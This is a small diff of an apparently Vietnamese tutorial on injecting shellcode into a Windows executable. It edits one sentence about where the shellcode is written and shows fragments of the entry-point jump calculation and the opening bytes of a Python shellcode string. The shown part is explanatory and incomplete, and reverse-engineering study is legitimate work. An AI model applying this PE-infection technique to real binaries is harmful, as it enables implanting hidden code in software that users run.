@@ -96,7 +96,7 @@ jump_address = (entry_point_old + image_base - 5 - new_entry_point - 45) & 0xfff
 ```
 
 
-Đã xong, giờ ghi shellcode vào đúng offset
+Đã xong, giờ ghi shellcode vào địa chỉ **raw_address_of_shell_code**
 ```python
 shellcode = '\x33\xC0'
 shellcode += '\x40'
